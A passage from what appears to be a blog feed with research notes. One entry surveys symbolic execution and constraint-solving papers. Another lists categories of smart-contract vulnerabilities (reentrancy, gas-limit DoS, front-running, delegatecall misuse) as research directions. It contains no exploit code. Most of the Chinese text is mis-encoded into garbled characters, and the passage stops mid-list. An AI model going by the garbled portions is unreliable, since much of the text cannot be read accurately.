è¦†ç›–ç‡ã€‚ä½†æ˜¯ï¼Œä¸Šè¿°å„æ–¹æ³•æ³¨é‡ç¬¦å·æ‰§è¡Œè¿‡ç¨‹ä¸­çš„è·¯å¾„å‘ç°é—®é¢˜ï¼Œè€Œéæµ‹è¯•ç”¨ä¾‹ç²¾ç¡®è¦†ç›–è·¯å¾„é—®é¢˜ï¼Œæ•…<strong>å¯¹äºç‰¹æ®Šå‚æ•°æƒ…å†µä¸‹çš„æµ‹è¯•ç”¨ä¾‹ç²¾ç¡®ç”Ÿæˆå­˜åœ¨ä¸è¶³</strong>ã€‚</p><p>åŒæ—¶ï¼Œç¨‹åºä¸­å› è°ƒç”¨å¤§é‡å¤–éƒ¨ç¯å¢ƒå‡½æ•°ä¸”è‡ªèº«å‚æ•°å­˜åœ¨ç‰¹æ®Šæ€§ï¼Œæ•…ç¬¦å·æ‰§è¡Œç”Ÿæˆçš„æµ‹è¯•ç”¨ä¾‹å¯¼è‡´<strong>æŸäº›è·¯å¾„å°½ç®¡è¢«å‘ç°äº†å´æ— æ³•è¢«æ‰§è¡Œ</strong>ï¼Œè¿›è€Œé™ä½äº†<strong>ç¬¦å·æ‰§è¡Œçš„å‡†ç¡®æ€§å’Œè·¯å¾„è¦†ç›–ç‡</strong>ã€‚</p><ol type="1"><li><p><ahref="http://www.cqvip.com/qk/95939x/202001/7100718643.html">åŸºäºå‚æ•°çº¦æŸçš„åˆ†æ”¯è¦†ç›–ç¬¦å·æ‰§è¡Œä¼˜åŒ–ç®—æ³•</a></p><p>è¯¥ç®—æ³•é€šè¿‡æœç´¢æ”¶é›†<strong>ç¨‹åºä»£ç ä¸­å‡½æ•°çš„ç‰¹æ®Šå‚æ•°</strong>ï¼Œç„¶ååˆ©ç”¨è¿™äº›ç‰¹æ®Šå‚æ•°ä½œä¸ºçº¦æŸæ¡ä»¶ï¼Œæœ€åå°†çº¦æŸæ¡ä»¶æ·»åŠ åˆ°è·¯å¾„çš„çº¦æŸé›†ä¸­ã€‚è¯¥ç®—æ³•ä½¿ç¬¦å·æ‰§è¡Œç”Ÿæˆçš„æµ‹è¯•ç”¨ä¾‹æ›´åŠ ç²¾ç¡®ï¼Œä»è€Œå®ç°è¦†ç›–ç‰¹æ®Šçº¦æŸæ¡ä»¶ä¸‹çš„è·¯å¾„åˆ†æ”¯ï¼Œä»¥æé«˜ç¬¦å·æ‰§è¡Œçš„ç²¾ç¡®æ€§å’Œè·¯å¾„è¦†ç›–ç‡</p></li></ol><h3 id="çº¦æŸæ±‚è§£constraint-solving">çº¦æŸæ±‚è§£(Constraint Solving)</h3><ol type="1"><li><p>ä»¥ SMT æ±‚è§£å™¨ä¸ºä»£è¡¨çš„çº¦æŸæ±‚è§£æŠ€æœ¯å°±æ˜¯å…¶ä¸­çš„å…¸å‹ã€‚Z3æ˜¯ç”±å¾®è½¯å¼€å‘å¹¶ä¸»è¦ç”¨äºè½¯ä»¶éªŒè¯å’Œåˆ†æçš„ä¸€ç§ SMT æ±‚è§£å™¨ã€‚</p><p>Z3 å¯¹åŒ…å«éçº¿æ€§è®¡ç®—å’Œåº“å‡½æ•°è°ƒç”¨çš„è·¯å¾„çº¦æŸæ”¯æŒæ•ˆæœå¾ˆæœ‰é™ã€‚</p></li><li><p>å¯¹åŒ…å«<strong>éçº¿æ€§è®¡ç®—å’Œåº“å‡½æ•°è°ƒç”¨</strong>çš„è·¯å¾„çº¦æŸçš„è§£å†³ç­–ç•¥æ˜¯åŸºäºçº¦æŸç®€åŒ–ã€‚</p><p>æ··åˆæ‰§è¡Œï¼ˆConcolic executionï¼‰å°±æ˜¯å…¶ä¸­çš„å…¸å‹ä»£è¡¨ã€‚å®ƒç›´æ¥ä½¿ç”¨å…·ä½“å€¼æ¥ç®€åŒ–å¤æ‚è·¯å¾„çº¦æŸ SPF-Mixedé’ˆå¯¹å¤æ‚è·¯å¾„çº¦æŸï¼Œä¼˜å…ˆè®¡ç®—è·¯å¾„çš„ç®€å•çš„éƒ¨åˆ†ï¼Œç„¶åå°†è§£å‡ºçš„å€¼ä»£å…¥å¤æ‚éƒ¨åˆ†ä½œä¸ºå…¶è§£ã€‚é™¤äº†ä½¿ç”¨å…·ä½“å€¼ç®€åŒ–å¤æ‚è·¯å¾„çº¦æŸï¼Œ</p><p>çº¦æŸé‡ç”¨</p><ol type="1"><li><p><a href="https://arxiv.org/abs/2003.08350">Constraint Solvingwith Deep Learning for Symbolic Executio 2020 å¹´ 3 æœˆ</a></p><pre><code>Techniques like Green and GreenTrie reuse constraint solutions to speed up constraint solving for symbolic execution; however, these reuse techniques require syntactic/semantic equivalence or implication relationship between constraints.DeepSolver, a novel approach to constraint solving with deep learning for symbolic execution. Our key insight is to utilize the collective knowledge of a set of constraint solutions to train a deep neural network, which is then used to classify path conditions for their satisfiability during symbolic execution.</code></pre><p>çº¦æŸç®€åŒ–</p></li><li><p><ahref="http://gb.oversea.cnki.net/KCMS/detail/detail.aspx?filename=1017722728.nh&amp;dbcode=CMFD&amp;dbname=CMFDREF">åŠ¨æ€ç¬¦å·æ‰§è¡Œçº¦æŸæ±‚è§£ä¼˜åŒ–è®¾è®¡ä¸å®ç°_2017</a></p><p>æœ¬æ–‡ç€çœ¼äºåŠ¨æ€ç¬¦å·æ‰§è¡Œçš„çº¦æŸæ±‚è§£ä¼˜åŒ–é—®é¢˜ï¼Œæå‡ºä¸€ç§é’ˆå¯¹çº¦æŸé›†åˆçš„åŸºäºçº¿æ€§è§„åˆ’æŠ€æœ¯çš„ä¼˜åŒ–æ–¹æ³•ï¼Œé€šè¿‡æ­¤ä¼˜åŒ–æ–¹æ³•å¯ä»¥é™ä½çº¦æŸé›†åˆä¸­çº¦æŸæ¡ä»¶çš„å¤æ‚æ€§ï¼Œé™ä½åç»­æ±‚è§£ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹è¿‡ç¨‹çš„è®¡ç®—å¤æ‚åº¦ï¼Œä»ä¸€å®šç¨‹åº¦ä¸Šæå‡äº†çº¦æŸæ±‚è§£è¿‡ç¨‹çš„æ•ˆç‡ï¼Œæœ¬æ–‡å°†çº¿æ€§è§„åˆ’æŠ€æœ¯åº”ç”¨äºçº¦æŸæ±‚è§£è¿‡ç¨‹ï¼Œä»¥æ­¤å¯¹çº¦æŸæ±‚è§£è¿‡ç¨‹ä¸­å†—ä½™çš„çº¦æŸæ¡ä»¶è¿›è¡Œæ¶ˆé™¤ï¼Œä»¥æ­¤è¾¾åˆ°ä¼˜åŒ–çš„ç›®çš„</p></li></ol></li><li><p>é€šè¿‡çº¿æ€§æ‹Ÿåˆçš„æŠ€æœ¯æ¥ç®€åŒ–éçº¿æ€§çº¦æŸã€‚å°½ç®¡åŸºäºç®€åŒ–çº¦æŸæ±‚è§£æŠ€æœ¯çš„ç¬¦å·æ‰§è¡Œå·¥å…·èƒ½å¤Ÿæä¾›é’ˆå¯¹éçº¿æ€§è·¯å¾„çº¦æŸçš„æ”¯æŒï¼Œä½†æ˜¯å› ä¸ºè¯¥æŠ€æœ¯ç¼©å°äº†æ±‚è§£ç©ºé—´ï¼Œæ‰€ä»¥ä¹Ÿåªèƒ½é’ˆå¯¹æœ‰é™çš„æ¡ˆä¾‹é€‚ç”¨ã€‚</p></li><li><p>åŸºäºå¯å‘å¼æœç´¢çš„çº¦æŸæ±‚è§£æŠ€æœ¯</p><p>è¿™ç±»å·¥ä½œçš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯å°†å¤æ‚çº¦æŸçš„å¯æ»¡è¶³é—®é¢˜è½¬åŒ–ä¸ºä¸€ä¸ªæœç´¢é—®é¢˜ï¼Œçº¦æŸçš„ç¬¦å·åŒ–å˜é‡å°±æ˜¯æœç´¢ç©ºé—´ï¼ŒåŒæ—¶è®¾å®šä¸€ä¸ªç›®æ ‡å‡½æ•°ç”¨äºæŒ‡å¯¼æ•´ä¸ªæœç´¢è¿‡ç¨‹ã€‚å®ƒä»¬çš„æ€§èƒ½å¯¹å‚æ•°æ¯”è¾ƒæ•æ„Ÿï¼Œè€Œè¿™äº›å‚æ•°æ¯”è¾ƒéš¾æå‰è®¾å®šã€‚</p><ul class="task-list"><li><label><input type="checkbox" />å¯ä»¥å†çœ‹ä¸€ä¸‹ intro</label></li></ul><ol type="1"><li><p>Optimization Based on domain and contextual information</p><p><ahref="https://ieeexplore.ieee.org/abstract/document/5954425">OptimizingConstraint Solving to Better Support Symbolic Execution</a> Constraintsolvers are mostly used in a black-box fashion within symbolicexecution, without leveraging any of the contextual and domaininformation available.</p><p>Because constraint solvers are optimized for specific kinds ofconstraints and heavily based on on heuristicsï¼Œthis leaves on the tablemany opportunities for optimizing the solvers performance</p></li><li><p><ahref="https://dl.acm.org/doi/abs/10.1145/1595696.1595762">Sireum/TopiLDP: a lightweight semi-decision procedure for optimizing symbolicexecution-based analyses</a></p><p>Most solver implementations are designed to be used as a black box,and due to their aim as general purpose solvers, they often missoptimization opportunities that can be done by leveragingdomain-specific knowledge. We present optimization techniquesincorporated as a lightweight semi-decision procedure (LDP) thatprovides up to an order of magnitude faster analysis time when analyzingrealistic programs and well-known algorithms</p></li><li><p>semantics-preserving transformations</p><p><ahref="https://dl.acm.org/doi/abs/10.1145/3092703.3092728">Acceleratingarray constraints in symbolic execution</a>è¿™ä¸ªä¸æ˜¯å¯å‘å¼æœç´¢ï¼Œè€Œä¸”ä»–ä¸»è¦é’ˆå¯¹ ç¬¦å·æ‰§è¡Œä¸­çš„ Arrayï¼Œä¸»è¦æ˜¯å®ƒä¹Ÿç”¨äº†ä¿ç•™ä¸Šä¸‹æ–‡è¯­ä¹‰çš„æ–¹å¼ä¼˜åŒ–ï¼Œæ‰€ä»¥æ”¾åœ¨è¿™å„¿ã€‚ One of the mainscalability challenges is related to constraint solving: largeapplications and long exploration paths lead to complex constraints,often <strong>involving big arrays indexed by symbolicexpressions</strong>. We propose a set of semantics-preservingtransformations for array operations that take advantage of contextualinformation collected during symbolic execution. Our transformationslead to simpler encodings and hence better performance in constraintsolving.</p></li></ol></li><li><p>å¤æ‚çº¦æŸçš„å¯æ»¡è¶³é—®é¢˜è½¬æ¢ä¸ºä¼˜åŒ–é—®é¢˜</p><p>é€šè¿‡è®¾å®šåˆç†çš„ç›®æ ‡å‡½æ•°ï¼Œå¤æ‚çº¦æŸçš„å¯æ»¡è¶³é—®é¢˜åŒæ ·å¯ä»¥è½¬åŒ–ä¸ºä¼˜åŒ–é—®é¢˜ã€‚</p><ol type="1"><li><ahref="https://ieeexplore.ieee.org/abstract/document/7582790">2016.9_Symbolicexecution of complex program driven by machine learning based constraintsolving</a></li></ol><p><em>è§å¼€å¤´æ‘˜è¦</em></p><ol type="1"><li><ahref="http://gb.oversea.cnki.net/KCMS/detail/detail.aspx?filename=1017096079.nh&amp;dbcode=CMFD&amp;dbname=CMFD2017">2017.5_åŸºäºæœºå™¨å­¦ä¹ çº¦æŸæ±‚è§£çš„ç¬¦å·æ‰§è¡Œæ¡†æ¶</a></li></ol><p><em>è§ä¹¦ç­¾ Problem&amp;Answer</em> åŸºäºæœºå™¨å­¦ä¹ çš„ä¼˜åŒ–ç®—æ³• RACOSåŸºäºä¸€ä¸ªæ¨¡å‹å¯¹ä¼˜åŒ–ç©ºé—´è¿›è¡Œé‡‡æ ·ï¼Œç„¶åé€šè¿‡é‡‡æ ·ç‚¹çš„è¯„ä¼°åé¦ˆè¿›è¡Œå­¦ä¹ å¹¶ä¼˜åŒ–æ¨¡å‹ï¼Œæ¥ç€ä½¿ç”¨ä¼˜åŒ–åçš„æ¨¡å‹æŒ‡å¯¼ä¸‹ä¸€è½®çš„é‡‡æ ·ã€‚é€šè¿‡ä»¥ä¸Šé‡‡æ ·å’Œåé¦ˆå­¦ä¹ çš„ä¸æ–­è¿­ä»£ï¼ŒRACOSæœ€ç»ˆå®Œæˆå¯¹ä¼˜åŒ–é—®é¢˜çš„æ±‚è§£ã€‚ <em>è§ä¹¦ç­¾ RACOS çš„ç‰¹ç‚¹</em></p><p>å°†æ‰€æœ‰åŒ…å«å¤æ‚æ•°å€¼è®¡ç®—çš„çº¦æŸè¿›è¡Œç¼–ç ï¼Œå°†åŒ…å«å¤æ‚å‡½æ•°è°ƒç”¨çº¦æŸç¼–ç æˆäº†æœªè§£é‡Šçš„è·¯å¾„çº¦æŸã€‚é€šè¿‡è®¾å®šåˆç†çš„ç›®æ ‡å‡½æ•°ï¼Œå°†å¤æ‚è·¯å¾„çº¦æŸçš„æ»¡è¶³æ€§é—®é¢˜è½¬åŒ–æˆäº†ä¼˜åŒ–é—®é¢˜ï¼Œç„¶ååˆ©ç”¨åº•å±‚çš„ä¼˜åŒ–ç®—æ³•RACOS å®Œæˆå¯¹å¤æ‚è·¯å¾„çº¦æŸçš„æ±‚è§£ã€‚</p></li><li><p>é¢„æµ‹å¹¶é€‰æ‹©çš„æœ€ä½³çš„ solver</p><p><ahref="https://www.ndss-symposium.org/wp-content/uploads/bar2019_80_Wen_paper.pdf">EnhancingSymbolic Execution by Machine Learning Based SolverSelection_2019</a></p><p>Path Constraint Classifier (PCC), a machine learning basedmeta-solver that aims to reduce overall constraint solving latency bydynamically selecting a solver per query.</p></li></ol><h4 id="æœªåˆ†ç±»">æœªåˆ†ç±»</h4><ul class="task-list"><li><label><input type="checkbox" />è²Œä¼¼å±äºå¯å‘å¼</label></li></ul><ol type="1"><li><p><a href="https://arxiv.org/abs/1807.00575">Neuro-SymbolicExecution: The Feasibility of an Inductive Approach to SymbolicExecution_2018</a></p></li><li><p><ahref="https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_11-3_Shiqi_paper.pdf">Neuro-SymbolicExecution: Augmenting Symbolic Execution with NeuralConstraints_2019</a></p><p>symbolic execution limitations: the path explosion problem encumbersscalability,the need for language-specific implementation, the inabilityto handle complex dependencies, and the limited expressiveness oftheories supported by underlying satisfiability checkers.</p><p>Relationships between variables of interest are not expressibledirectly as purely symbolic constraints.</p><p><strong>neuro-symbolic execution</strong>â€”which learns anapproximation of the relationship between program values of interest, asa neural network. We develop a procedure for checking satisfiability ofmixed constraints, involving both symbolic expressions and neuralrepresentations.</p><p><em>çœ‹ä¸€ä¸‹æ‘˜è¦é‡Œé¢çš„æ•ˆæœ</em> å¾ˆå‰å®³çš„æ ·å­</p></li></ol><h3 id="æ€è·¯äºŒ">æ€è·¯äºŒ</h3><ol type="1"><li><p><ahref="http://gb.oversea.cnki.net/KCMS/detail/detail.aspx?filename=1018894893.nh&amp;dbcode=CMFD&amp;dbname=CMFDREF">æ¨¡ç³Šæµ‹è¯•ä¸ç¬¦å·æ‰§è¡Œç›¸ç»“åˆ</a></p><blockquote><p>è™½ç„¶é‡‡ç”¨æ¨¡ç³Šæµ‹è¯•å’Œç¬¦å·æ‰§è¡Œäº¤æ›¿æ¢ç´¢ç¨‹åºæ‰§è¡Œè·¯å¾„ï¼Œä¸€æ–¹é¢ç¬¦å·æ‰§è¡Œè§£å†³æ¨¡ç³Šæµ‹è¯•é™·å…¥ä»£ç è¦†ç›–ç‡å¢é•¿æ…¢çš„æƒ…å†µï¼Œè¿™æ ·èƒ½å¼•å¯¼æ¨¡ç³Šæµ‹è¯•æ¢ç´¢åˆ°ç¨‹åºæ›´æ·±å±‚æ¬¡çš„èŠ‚ç‚¹ï¼Œå¦ä¸€æ–¹é¢ï¼Œæ¨¡ç³Šæµ‹è¯•ä¹Ÿèƒ½ç›´æ¥é¿å…ç¬¦å·æ‰§è¡Œå¯èƒ½å¸¦æ¥çš„è·¯å¾„çˆ†ç‚¸é—®é¢˜ã€‚ä½†æ˜¯ä¸€äº›å®éªŒç»“æ„è¡¨æ˜ï¼ŒåŸºäºç¬¦å·æ‰§è¡Œå¢å¼ºçš„æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯ä»ç„¶ä¼šå—é™äºç¬¦å·æ‰§è¡Œä¸­çš„çº¦æŸæ±‚è§£é—®é¢˜ï¼Œç¬¦å·æ‰§è¡Œçš„å¼•å…¥å¯èƒ½ä¼šå¼±åŒ–æ¨¡ç³Šæµ‹è¯•æœ¬èº«çš„å¯æ‰©å±•æ€§ã€‚--- æ¥æº <ahref="http://kns.cnki.net/kcms/detail/Detail.aspx?dbname=CAPJLAST&amp;filename=QHXB20181029000&amp;v=">è‡ªåŠ¨åŒ–åˆ°æ™ºèƒ½åŒ–:è½¯ä»¶æ¼æ´æŒ–æ˜æŠ€æœ¯è¿›å±•</a></p></blockquote><ol start="3" type="1"><li><ol start="2" type="1"><li>ç¬¦å·æ‰§è¡Œä¸æ±¡ç‚¹åˆ†æç»“åˆ</li></ol></li></ol></li><li><p><ahref="https://dl.acm.org/doi/abs/10.1145/1390630.1390635">Combiningunit-level symbolic execution and system-level concrete execution fortesting nasa software</a></p></li></ol><h3 id="æ€è·¯ä¸‰">æ€è·¯ä¸‰</h3><p>è¿™åªæ˜¯ä¸€ä¸ªæƒ³æ³•ï¼Œå› ä¸ºæˆ‘çœ‹æœ‰äº›è®ºæ–‡ä¸ºäº†è§£å†³ä»–ä»¬çš„é—®é¢˜ï¼Œè€Œç‰¹æ„æ”¹è¿›ç¬¦å·æ‰§è¡Œã€‚</p><p>å¯¹æ™ºèƒ½åˆçº¦çš„ç¬¦å·æ‰§è¡Œï¼Œä¸çŸ¥é“æ™ºèƒ½åˆçº¦æœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Œè¦æ˜¯æœ‰çš„è¯ï¼Œå¯ä»¥é’ˆå¯¹å®ƒå»æ”¹è¿›ç¬¦å·æ‰§è¡Œã€‚è™½ç„¶è¿™æ ·ä¸æ˜¯è§£è€¦åˆçš„ç»“æ„ï¼Œä½†æ˜¯åº”è¯¥èƒ½æ”¹å–„æ™ºèƒ½åˆçº¦çš„æ£€æµ‹ç»“æœã€‚</p><p>ä¸‹é¢æ˜¯ä¸€äº›æ”¹è¿›ç¬¦å·æ‰§è¡Œä»¥é€‚åº”ä»–ä»¬è¦è§£å†³çš„é—®é¢˜çš„è®ºæ–‡ï¼Œçœ‹ä¸€ä¸‹é¢˜ç›®å•¥çš„ï¼Œæ²¡å‡†æœ‰å¯å‘ï¼Ÿ</p><ol type="1"><li><p><ahref="https://dl.acm.org/doi/10.1145/2451116.2451152">Verifying systemsrules using rule-directed symbolic execution</a></p><p>existing symbolic execution systems often blindly explore manyredundant program paths while missing relevant ones that may containbugs. Our key insight is that only a small portion of paths are relevantto rules, and the rest (majority) of paths are irrelevant and do notneed to be verified.</p></li></ol><h2 id="æœªåˆ†ç±»-1">æœªåˆ†ç±»</h2><ol type="1"><li><p><ahref="http://kns.cnki.net/kcms/detail/Detail.aspx?dbname=CAPJLAST&amp;filename=QHXB20181029000&amp;v=">è‡ªåŠ¨åŒ–åˆ°æ™ºèƒ½åŒ–:è½¯ä»¶æ¼æ´æŒ–æ˜æŠ€æœ¯è¿›å±•</a></p></li><li><p><a href="https://dl.acm.org/doi/abs/10.1145/3182657">A Survey ofSymbolic Execution Techniques</a></p></li><li><p><ahref="https://blog.csdn.net/woswod/article/details/88630219#1.%20%E4%BB%8B%E7%BB%8D">ASurvey of Symbolic Execution Techniques ç¬¦å·æ‰§è¡Œä¸­æ–‡ç¬”è®°</a></p></li><li><p><ahref="https://www.cnblogs.com/XBWer/p/9510884.html">è½¯ä»¶æµ‹è¯•ä¸­çš„ç¬¦å·æ‰§è¡ŒSymbolic Execution for Software Testing: Three DecadesLater</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è°ƒç ”æ™ºèƒ½åˆçº¦æ¼æ´å’Œæ£€æµ‹åå¯è€ƒè™‘çš„æ–¹å‘</title>
      <link href="/blog/2021/04/30/blockchain/eth_vulns/vuln_idea/"/>
      <url>/blog/2021/04/30/blockchain/eth_vulns/vuln_idea/</url>
      
        <content type="html"><![CDATA[<h1 id="å¯ä»¥è€ƒè™‘çš„æ–¹å‘">å¯ä»¥è€ƒè™‘çš„æ–¹å‘</h1><h2 id="call-å®‰å…¨">Call å®‰å…¨</h2><ol type="1"><li><p>Improper Check or Handling of Exceptional Conditions</p><p>å…¶ä»–åï¼šExceptions in external calls/Mishandled Exceptions/</p><ol type="1"><li><p>Unchecked Return Value/Uncheck low-level call</p></li><li><p>Exception disorder</p><p>ä¸»è¦æ˜¯åµŒå¥—è°ƒç”¨é“¾å¼‚å¸¸å¤„ç†ä¸å½“</p></li><li><p>DoS with Failed External Call/External calls without gasstipends</p></li></ol></li><li><p>Reentrancy(a.k.a. recursive call attack)</p><ol type="1"><li><p>Reentrancy on a Single Function</p></li><li><p>Cross-function Reentrancy</p></li><li><p>Reentrancy Mutex ä½¿ç”¨ä¸å½“ when you have multiple contracts thatneed to cooperate.</p><p>æ­»é”</p></li></ol></li><li><p>Freezing ether</p><ol type="1"><li>åªæœ‰æ”¶é’±å‡½æ•°ï¼Œæ— è½¬è´¦å‡½æ•°</li><li>é€šè¿‡ delegatecallè½¬è´¦å§”æ‰˜ç»™å…¶ä»–åˆçº¦ï¼Œå¦‚æœå…¶ä»–åˆçº¦æ­»äº†ï¼Œå°±é€ æˆæ­¤é—®é¢˜</li></ol></li><li><p>Delegatecall to UntrustedCallee/DelegateCallWithUserInput/Controlled Delegatecall</p><p><em>ä»¥ä¸‹æ¼æ´ä¸ Call æœ‰å…³ï¼Œä½†æ˜¯ä¸éƒ½æ˜¯ call çš„é”™è¯¯</em></p></li><li><p>Insufficient Gas Griefing</p><ol type="1"><li><p>require Gasleft ä¿è¯ subcall å®Œæˆ</p><p>å®¡æŸ¥</p></li></ol></li><li><p>Call to the unknown</p><p>ä»£ç å†™é”™ï¼ŒæœªåŒ¹é…åˆ°ï¼Œé»˜è®¤è°ƒç”¨ fallback å‡½æ•°</p></li><li><p><strong>Call æ³¨å…¥</strong></p></li><li><p>Improper Following of Specification by Caller</p><p>Requirement Violation SWC-123</p></li></ol><h2 id="dos-focus">DOS focus</h2><ol type="1"><li><p>Insufficient Control Flow Management</p><p>Meta transactions Relay è½¬å‘è€…ä¸æ–­æä¾›è¾ƒå°‘ gas ä½¿å…¶å¤±è´¥ï¼Œä»è€Œä¸æ–­è·å–ether æˆ–è€…å½¢æˆ Dos</p></li><li><p>DoS With Block Gas Limit</p><ol type="1"><li><p>Gas Limit DoS on a Contract via Unbounded Operations/Loop over anarray of unknown size / Looping through externally manipulated mappingsor arrays/é€šè¿‡å¤–éƒ¨æ“çºµæ˜ å°„æˆ–æ•°ç»„ï¼ˆArrayï¼‰å¾ªç¯</p><p>lock Ether</p></li><li><p>Gas Limit DoS on the Network via Block Stuffing/Block Stuffingattacks/Transaction congestion Attack/Unclogged blockchain reliance</p><p>Front-runing Suppression/Block Stuffing attacks/TransactionCongestion Attack æ‹¥æŒ¤å µå¡ <ahref="https://solmaz.io/2018/10/18/anatomy-block-stuffing/">The Anatomyof a Block Stuffing Attack</a></p></li></ol></li><li><p>Owner operations æ‰€æœ‰è€…æ“ä½œ</p></li><li><p>DoS with Failed External Call/External calls without gasstipends</p></li><li><p>Progressing state based on external callsåŸºäºå¤–éƒ¨è°ƒç”¨çš„è¿›å±•çŠ¶æ€</p></li><li><p>Unexpected Ether balance/Forcibly Sending Ether to a Contract</p><p>In the worst case scenario this could lead to DOS conditions thatmight render the contract unusable.</p></li><li><p>DoS with (Unexpected) revert</p><p>æ¶æ„é€€æ¬¾çš„ fallback å‡½æ•°</p></li><li><p>DoS with selfdestruct</p></li></ol><h2 id="gas-foucus">Gas foucus</h2><ol type="1"><li><p>Insufficient Gas Griefing</p><p>subcall fail</p><p>è§£å†³æ–¹æ³•</p><ol type="1"><li>Require Gasleft ä¿è¯ subcall å®Œæˆ</li><li>Permit only trusted accounts to relay the transaction.</li></ol></li><li><p>Meta transactions Relay</p></li><li><p>Improper Initialization</p><p>Message call with hardcoded gas amount</p></li><li><p>DoS With Block Gas Limit</p><p>Uncontrolled Resource Consumption</p><ol type="1"><li><p>Gas Limit DoS on a Contract via Unbounded Operations/Loop over anarray of unknown size</p><p>lock Ether</p></li><li><p>Gas Limit DoS on the Network via Block Stuffing/Block Stuffingattacks/Transaction congestion Attack</p></li></ol><p>å®ƒä¸åªå¯ä»¥ç”¨æ¥æ¶ˆè€— Gasï¼Œ <ahref="https://medium.com/level-k/public-disclosure-malicious-gastoken-minting-236b2f8ace38">è¿˜å¯ä»¥é€šè¿‡GasToken æ¥å€’æˆé’±</a></p></li><li><p>GasLess Send/Failed Send</p></li></ol><h2id="inclusion_from_untrusted_control_sphere">inclusion_from_untrusted_control_sphere</h2><ol type="1"><li><p>Reentrancy(a.k.a. recursive call attack)</p><ol type="1"><li><p>Reentrancy on a Single Function</p></li><li><p>Cross-function Reentrancy</p></li><li><p>Reentrancy Mutex ä½¿ç”¨ä¸å½“ when you have multiple contracts thatneed to cooperate.</p><p>æ­»é”</p></li></ol></li><li><p>å˜é‡è¦†ç›–é—®é¢˜å¯¼è‡´ä»»æ„å­˜å‚¨åœ°å€å†™</p><p>å¯ä»¥æ§åˆ¶æ•°ç»„åç§»æ—¶</p></li><li><p>DoS with (Unexpected) revert</p><p>æ¶æ„é€€æ¬¾çš„ fallback å‡½æ•°</p></li><li><p>Weak Sources of Randomness from Chain Attributes/Use ofInsufficiently Random Values/Entropy Illusion</p></li><li><p>Delegatecall to Untrusted Callee</p></li><li><p>Insufficient Gas Griefing</p><pre><code>subcall fail1. Require Gasleft ä¿è¯ subcall å®Œæˆ2. Permit only trusted accounts to relay the transaction.</code></pre></li><li><p>Meta transactions Relay</p><p>è½¬å‘è€…ä¸æ–­æä¾›è¾ƒå°‘ gas ä½¿å…¶å¤±è´¥ï¼Œä»è€Œä¸æ–­è·å– ether æˆ–è€…å½¢æˆDos</p></li></ol><h2 id="fallback-focus">Fallback Focus</h2><ol type="1"><li><p>Reentrancy(a.k.a. recursive call attack)</p><ol type="1"><li><p>Reentrancy on a Single Function</p></li><li><p>Cross-function Reentrancy</p></li><li><p>Reentrancy Mutex ä½¿ç”¨ä¸å½“ when you have multiple contracts thatneed to cooperate.</p><p>æ­»é”</p></li></ol></li><li><p>Call to the unknown</p><p>ä»£ç å†™é”™ï¼ŒæœªåŒ¹é…åˆ°ï¼Œé»˜è®¤è°ƒç”¨ fallback å‡½æ•°</p></li><li><p>DoS with (Unexpected) revert</p><p>æ¶æ„é€€æ¬¾çš„ fallback å‡½æ•°</p></li></ol><h2 id="storage-access">Storage access</h2><ol type="1"><li><p>Uninitialized storage pointer (SWC-109, SP-14)</p><p>Note: As of compiler version 0.5.0 and higher this issue has beensystematically resolved as contracts with uninitialised storage pointersdo no longer compile.</p></li><li><p>Delegatecall and storage layout (SWC-112, SP-4)</p></li><li><p>Overlap attack/Arbitrary Jump with Function TypeVariable</p></li><li><p>å˜é‡è¦†ç›–é—®é¢˜å¯¼è‡´ä»»æ„å­˜å‚¨åœ°å€å†™</p><p>å¯ä»¥æ§åˆ¶æ•°ç»„åç§»æ—¶</p></li><li><p>storge HASH Collisions</p></li></ol><h2 id="flow-focus">Flow focus</h2><h3 id="internal-control-flow">Internal control flow</h3><ol type="1"><li><a href="https://cwe.mitre.org/data/definitions/670.html">CWE-670:Always-Incorrect Control Flow Implementation</a><ol type="1"><li>Assert Violation //å­˜åœ¨æŸæ¡æ§åˆ¶æµæ€»æ˜¯é”™è¯¯ 1. æœ‰ bug æˆ–è€… ä¸è¯¥ç”¨Assert</li></ol></li><li>Incorrect Inheritance Order</li><li>Arbitrary jump with function type variable (SWC-127)</li><li>Assembly return in constructor: this trick tampers with standarddeployment process; as a result, actually deployed bytecode has littlein common with the source code</li></ol><h3id="improper_enforcement_workflowbehavior-workflow-æ£€æµ‹è¡Œä¸ºå·¥ä½œæµè¡Œä¸ºé¡ºåºä¸å½“">improper_enforcement_workflow/Behaviorworkflow æ£€æµ‹è¡Œä¸ºå·¥ä½œæµ/è¡Œä¸ºé¡ºåºä¸å½“</h3><ol type="1"><li><p><ahref="https://cwe.mitre.org/data/definitions/841.html">CWE-841: ImproperEnforcement of Behavioral Workflow</a> è¡Œä¸ºå·¥ä½œæµçš„ä¸æ°å½“å®æ–½</p><ol type="1"><li><p>Reentrancy(a.k.a. recursive call attack)</p><ol type="1"><li><p>Reentrancy on a Single Function</p></li><li><p>Cross-function Reentrancy</p></li><li><p>Reentrancy Mutex ä½¿ç”¨ä¸å½“ when you have multiple contracts thatneed to cooperate.</p><p>æ­»é”</p></li></ol></li></ol></li><li><p>Insufficient Control Flow Management</p><ol type="1"><li><p>Insufficient Gas Griefing</p><p>subcall fail</p><ol type="1"><li>Require Gasleft ä¿è¯ subcall å®Œæˆ</li><li>Permit only trusted accounts to relay the transaction.</li></ol></li><li><p>Meta transactions Relay</p><p>è½¬å‘è€…ä¸æ–­æä¾›è¾ƒå°‘ gas ä½¿å…¶å¤±è´¥ï¼Œä»è€Œä¸æ–­è·å– ether æˆ–è€…å½¢æˆDos</p></li></ol></li><li><p>Race Condition/Concurrent Execution using Shared Resource withImproper Synchronization</p><p>Front-runnig: ç›®å‰æœ€å¸¸å‘ç”Ÿï¼š The ERC20 token standard includes afunction called 'approve', å³: approve æˆæƒå‡½æ•°æ¡ä»¶ç«äº‰</p><ol type="1"><li><p>Displacement/é¡¶æ›¿</p></li><li><p>Insertion/Transaction Order Dependence/Unpredictable stateæå‰æ’é˜Ÿï¼Œå€’å–</p><ul><li>TODAmount</li><li>TODReceiver</li><li>TODTransfer</li></ul></li><li><p>Suppression/Block Stuffing attacks/Transaction Congestion Attackæ‹¥æŒ¤å µå¡ <ahref="https://solmaz.io/2018/10/18/anatomy-block-stuffing/">The Anatomyof a Block Stuffing Attack</a></p></li></ol></li><li><p>Exception 